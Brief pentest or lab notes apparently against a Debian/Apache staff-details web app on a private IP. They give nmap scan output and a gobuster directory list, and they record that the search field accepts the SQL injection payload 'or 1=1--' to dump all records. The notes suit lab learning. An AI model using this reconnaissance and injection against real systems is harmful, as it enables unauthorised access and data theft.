??$ nmap $ip -sC -sV -p-
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-25 14:05 +0000
Nmap scan report for 192.168.55.209
Host is up (0.00056s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.38 ((Debian))
|_http-title: Example.com - Staff Details - Welcome
|_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.97 seconds

gobuster
/css
/includes

search
search='or 1=1--' retrieves all. sql injection works
<img width="416" height="495" alt="image" src="https://github.com/user-attachments/assets/255fa331-09d1-4e9c-bc33-78ea1470d1a4" />
